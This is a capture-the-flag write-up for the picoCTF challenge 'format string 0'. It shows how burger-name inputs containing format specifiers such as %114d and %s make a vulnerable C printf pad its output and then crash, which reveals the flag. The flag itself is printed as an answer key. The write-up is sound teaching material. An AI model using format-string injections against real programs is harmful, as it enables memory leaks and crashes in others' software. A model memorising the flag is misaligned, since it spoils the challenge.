# format string 0

**Author:** Cheng Zhang

## Description
Can you use your knowledge of format strings to make the customers happy?

- [Download the binary](#)
- [Download the source](#)
- Connect with the challenge instance: `nc mimas.picoctf.net 56966`

---

## Solution Walkthrough

This challenge demonstrates format string vulnerabilities in C. You interact with a burger shop simulation, where you must recommend burgers to two customers.

### Step 1: Patrick's Burger

You are asked to choose from:
- Breakf@st_Burger
- Gr%114d_Cheese
- Bac0n_D3luxe

**Input:** `Gr%114d_Cheese`

**Explanation:**
- `%114d` is a format specifier for printing an integer, but since no argument is provided, it prints garbage or nothing, but the string is accepted.
- The program checks the length of the printed string. If it is large enough, you proceed to the next customer.

### Step 2: Sponge Bob's Burger

You are asked to choose from:
- Pe%to_Portobello
- $outhwest_Burger
- Cla%sic_Che%s%steak

**Input:** `Cla%sic_Che%s%steak`

**Explanation:**
- The string contains multiple format specifiers (`%s`). When printed, the program tries to read strings from the stack, which can cause undefined behavior or a segmentation fault.
- This triggers the signal handler, which prints the flag.

### Output Example
```
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)

flag  : picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_a1d85b3e}
```

## Key Takeaways
- Format string vulnerabilities can be exploited by passing format specifiers in user input.
- Unchecked format strings can lead to memory leaks, crashes, or even code execution.
- Always sanitize user input before using it in functions like `printf`.

---

**Flag:** `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_a1d85b3e}`
